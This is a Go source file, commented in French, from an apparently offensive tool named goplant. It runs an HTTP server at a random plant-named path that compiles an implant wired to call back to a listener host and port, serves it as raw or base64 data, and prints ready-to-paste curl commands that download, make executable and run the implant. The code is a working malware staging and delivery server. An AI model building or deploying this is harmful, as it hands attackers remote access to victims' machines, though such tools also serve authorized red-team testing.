package server

import (
	"encoding/base64"
	"fmt"
	"goplant/internal/builder"
	"goplant/internal/template"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var plants = []string{
	"Rose", "Sunflower", "Cactus", "Maple", "Oak", "Bamboo", "Aloe", "Tulip",
	"Hibiscus", "Sequoia", "Lavender", "Mint", "Venusflytrap", "Baobab", "Lotus",
	"Orchid", "Daisy", "Fern", "Bonsai", "Poinsettia",
}

// Server représente le serveur HTTP de goplant
type Server struct {
	lhost      string
	lport      string
	bindAddr   string
	bindPort   string
	targetOS   string
	arch       string
	plantPath  string
	httpServer *http.Server
}

// New crée une nouvelle instance du serveur
func New(lhost, lport, bindAddr, bindPort, targetOS, arch string) *Server {
	// Sélectionner une plante aléatoire
	randomPlant := plants[rand.Intn(len(plants))]
	plantPath := "/" + strings.ToLower(randomPlant)

	return &Server{
		lhost:     lhost,
		lport:     lport,
		bindAddr:  bindAddr,
		bindPort:  bindPort,
		targetOS:  targetOS,
		arch:      arch,
		plantPath: plantPath,
	}
}

// Start démarre le serveur HTTP
func (s *Server) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc(s.plantPath, s.handleImplant)

	addr := fmt.Sprintf("%s:%s", s.bindAddr, s.bindPort)
	s.httpServer = &http.Server{Addr: addr, Handler: mux}

	// Afficher les informations du serveur
	fmt.Println("╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║          🪴 Goplant Server started 🪴                       ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")
	fmt.Printf("🪴Listen on:   http://%s%s\n", addr, s.plantPath)
	fmt.Printf("\n🪴 Implant : %s/%s --> %s:%s\n", s.targetOS, s.arch, s.lhost, s.lport)
	// fmt.Printf("   - Listener: %s:%s\n", s.lhost, s.lport)
	// fmt.Printf("   - Platform: %s/%s\n", s.targetOS, s.arch)
	fmt.Printf("\n\n🪴 Payloads : \n")
	fmt.Printf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
	fmt.Printf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
	fmt.Printf("\n")

	return s.httpServer.ListenAndServe()
}

// handleImplant traite les requêtes GET sur le chemin aléatoire
func (s *Server) handleImplant(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Only GET requests are allowed", http.StatusMethodNotAllowed)
		return
	}

	// Logger la requête
	clientIP := r.RemoteAddr
	if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
		clientIP = clientIP[:idx]
	}
	logRequest(s.plantPath, clientIP)

	// Vérifier le flag encode
	encode := r.URL.Query().Get("encode")
	isBase64 := encode == "base64"

	// Générer l'implant dans un fichier temporaire
	tmpDir, err := os.MkdirTemp("", "goplant-serve-*")
	if err != nil {
		http.Error(w, "Error creating temp directory", http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(tmpDir)

	tmpFile := filepath.Join(tmpDir, "implant")

	// Récupérer le template et générer l'implant
	tmpl, err := template.GetTemplate("go")
	if err != nil {
		http.Error(w, fmt.Sprintf("Error getting template: %v", err), http.StatusInternalServerError)
		return
	}

	// Générer l'implant en silence (redirection stdout/stderr)
	oldStdout := os.Stdout
	oldStderr := os.Stderr
	os.Stdout, _ = os.Open(os.DevNull)
	os.Stderr, _ = os.Open(os.DevNull)

	err = builder.Build(tmpl, s.lhost, s.lport, tmpFile, s.targetOS, s.arch)

	os.Stdout = oldStdout
	os.Stderr = oldStderr

	if err != nil {
		http.Error(w, fmt.Sprintf("Error building implant: %v", err), http.StatusInternalServerError)
		return
	}

	// Lire le fichier généré
	implantData, err := os.ReadFile(tmpFile)
	if err != nil {
		http.Error(w, "Error reading generated implant", http.StatusInternalServerError)
		return
	}

	// Servir le fichier
	if isBase64 {
		w.Header().Set("Content-Type", "text/plain")
		encoded := base64.StdEncoding.EncodeToString(implantData)
		w.Write([]byte(encoded))
	} else {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=implant")
		w.Write(implantData)
	}
}

// logRequest enregistre une requête avec l'heure et l'IP
func logRequest(path string, clientIP string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	fmt.Printf("[%s] GET %s from %s\n", timestamp, path, clientIP)
}
